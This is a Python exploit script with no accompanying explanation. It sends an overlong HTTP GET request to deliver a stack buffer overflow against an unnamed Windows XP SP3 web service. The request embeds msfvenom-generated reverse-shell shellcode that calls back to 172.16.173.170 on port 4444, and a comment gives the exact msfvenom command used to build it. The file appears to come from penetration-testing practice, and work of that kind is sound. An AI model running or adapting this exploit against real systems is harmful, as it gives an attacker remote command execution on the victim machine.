#!/usr/bin/env python

import sys, socket

if len(sys.argv) < 3:
	print('Usage: {n} <HOST> <PORT>'.format(n=sys.argv[0]))
        sys.exit(1)

# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.173.170 LPORT=4444 -f python -b '\x00\x0a\x0d' -a x86 --platform Windows -v shellcode -n 30
# x86/shikata_ga_nai succeeded with size 351 (iteration=0)
# x86/shikata_ga_nai chosen with final size 351
# Successfully added NOP sled from x86/single_byte
# Payload size: 381 bytes
shellcode =  ""
shellcode += "\x90\x42\x40\x4b\x43\x3f\x93\x9b\x49\xf9\x2f\x40"
shellcode += "\xfd\x92\x90\x48\x3f\x99\x4a\x4a\x98\x9b\x3f\x2f"
shellcode += "\x49\x4b\x41\x9b\xfd\x9f\xdb\xc4\xba\xb6\x2a\xfe"
shellcode += "\x96\xd9\x74\x24\xf4\x5e\x33\xc9\xb1\x52\x83\xc6"
shellcode += "\x04\x31\x56\x13\x03\xe0\x39\x1c\x63\xf0\xd6\x62"
shellcode += "\x8c\x08\x27\x03\x04\xed\x16\x03\x72\x66\x08\xb3"
shellcode += "\xf0\x2a\xa5\x38\x54\xde\x3e\x4c\x71\xd1\xf7\xfb"
shellcode += "\xa7\xdc\x08\x57\x9b\x7f\x8b\xaa\xc8\x5f\xb2\x64"
shellcode += "\x1d\x9e\xf3\x99\xec\xf2\xac\xd6\x43\xe2\xd9\xa3"
shellcode += "\x5f\x89\x92\x22\xd8\x6e\x62\x44\xc9\x21\xf8\x1f"
shellcode += "\xc9\xc0\x2d\x14\x40\xda\x32\x11\x1a\x51\x80\xed"
shellcode += "\x9d\xb3\xd8\x0e\x31\xfa\xd4\xfc\x4b\x3b\xd2\x1e"
shellcode += "\x3e\x35\x20\xa2\x39\x82\x5a\x78\xcf\x10\xfc\x0b"
shellcode += "\x77\xfc\xfc\xd8\xee\x77\xf2\x95\x65\xdf\x17\x2b"
shellcode += "\xa9\x54\x23\xa0\x4c\xba\xa5\xf2\x6a\x1e\xed\xa1"
shellcode += "\x13\x07\x4b\x07\x2b\x57\x34\xf8\x89\x1c\xd9\xed"
shellcode += "\xa3\x7f\xb6\xc2\x89\x7f\x46\x4d\x99\x0c\x74\xd2"
shellcode += "\x31\x9a\x34\x9b\x9f\x5d\x3a\xb6\x58\xf1\xc5\x39"
shellcode += "\x99\xd8\x01\x6d\xc9\x72\xa3\x0e\x82\x82\x4c\xdb"
shellcode += "\x05\xd2\xe2\xb4\xe5\x82\x42\x65\x8e\xc8\x4c\x5a"
shellcode += "\xae\xf3\x86\xf3\x45\x0e\x41\x50\x89\xbd\x3b\xc0"
shellcode += "\xa8\xbd\x2a\x4d\x24\x5b\x26\x7d\x60\xf4\xdf\xe4"
shellcode += "\x29\x8e\x7e\xe8\xe7\xeb\x41\x62\x04\x0c\x0f\x83"
shellcode += "\x61\x1e\xf8\x63\x3c\x7c\xaf\x7c\xea\xe8\x33\xee"
shellcode += "\x71\xe8\x3a\x13\x2e\xbf\x6b\xe5\x27\x55\x86\x5c"
shellcode += "\x9e\x4b\x5b\x38\xd9\xcf\x80\xf9\xe4\xce\x45\x45"
shellcode += "\xc3\xc0\x93\x46\x4f\xb4\x4b\x11\x19\x62\x2a\xcb"
shellcode += "\xeb\xdc\xe4\xa0\xa5\x88\x71\x8b\x75\xce\x7d\xc6"
shellcode += "\x03\x2e\xcf\xbf\x55\x51\xe0\x57\x52\x2a\x1c\xc8"
shellcode += "\x9d\xe1\xa4\xf8\xd7\xab\x8d\x90\xb1\x3e\x8c\xfc"
shellcode += "\x41\x95\xd3\xf8\xc1\x1f\xac\xfe\xda\x6a\xa9\xbb"
shellcode += "\x5c\x87\xc3\xd4\x08\xa7\x70\xd4\x18"


cmd = 'GET'
# windows xp sp 3
buf = 'A' * 1788 + '\x9F\x31\x9D\x7C' + shellcode + 'C'*(2220-1788-4-len(shellcode))
end = 'HTTP/1.1\r\n\r\n'

payload = cmd+buf+end

host = str(sys.argv[1])
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(payload)
s.close()

print('Crashed!')
